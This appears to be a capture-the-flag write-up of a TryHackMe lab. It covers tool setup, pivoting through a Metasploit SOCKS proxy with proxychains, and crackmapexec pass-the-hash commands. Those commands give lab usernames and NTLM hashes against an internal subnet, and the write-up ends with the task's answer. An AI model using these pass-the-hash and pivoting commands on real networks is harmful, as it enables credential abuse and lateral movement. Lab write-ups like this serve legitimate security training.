# Good Intentions, Courtesy of Microsoft 

Unfortunately I choose to solve a probelm by moving to the AttackBox for the remmina setup, but then crackmapexec was a massive pain to setup, I tried various methods so with all my proxychain and metsploit setup waiting to go I then could perform the exploit. Nevermind I added lots to my [Archive Respository](https://github.com/7RU7H/Archive). This took a very longtime I do not want to have sit through this again, possibly this is one of the weakness areas of TryHackMe, but I got loads coding and note formating done. I almost finished my LolbasFinder.ps1 script to check the existence of living off the land binaries on a Windows machine.

```bash
apt-get update
apt-get upgrade
apt install bloodhound
apt-get install amass python3-setuptools python3-tk python3-pip python3-dev
pip3 install impacket
apt install gem
```

Then I ran `locate impacket` after discovering it was already on the VM thankfully, which for some reason I thought it was not. Amusingly squished ascii art, but finally got this tool working.

[working](Screenshots/gi-working-cme.png)

Then had reinstall gem and and [reline](https://github.com/ruby/reline/)
```bash
cd /usr/share/metasploit-framework/vendor/bundle
bundle install
```

Got this error:
`'You have already activated thor 1.2.1, but your Gemfile requires thor 1.0.1. Prepending bundle exec to your command may solve this.'`

It feel sad to admit, this really was the wall in that pretty much ends the my attempt to only use TryHackMe VMs to complete this. Given that now I wouldnot be using the Attackbox or the Kali VM from THM there will be more of `this` and less screenshots. Also the approach for the proxying with metasploit as now I using msf6. Thanks to [gwillcox-r7](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/server/socks_proxy.md) for the Documentation.

```msfconsole
use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

Add `socks5 	127.0.0.1 1080` to the proxycahin.conf file and comment out any anothers. I ran proxychains with four hases i have toggle here just in case:
```{toggle}
proxychains crackmapexec smb 10.200.102.0/24 -u admin-petersj -d THROWBACK.LOCAL -H 74fb0a2ee8a066b1e372475dcbc121c5

proxychains crackmapexec smb 10.200.102.0/24 -u PetersJ -d THROWBACK.local -H b81e7daf21f66ff3b8f7c59f3b88f9b6 

proxychains crackmapexec smb 10.200.102.0/24 -u BlaireJ -d THROWBACK.local -H c374ecb7c2ccac1df3a82bce4f80bb5b 

proxychains crackmapexec smb 10.200.102.0/24 -u HumphreyW -d THROWBACK.local -H 1c13639dba96c7b53d26f7d00956a364
```

![working](Screenshots/gi-crackmap-1.png)

Find all the output in this directory with the files starting "gi-pc-$username". Here is screenshot of it all working. 

![blaireJ](Screenshots/gi-crackmap-blairej.png)

## Answer

What two users could successfully pass the hash to THROWBACK-WS01? (In alphabetical order)
```{toggle}
BlaireJ, HumphreyW
```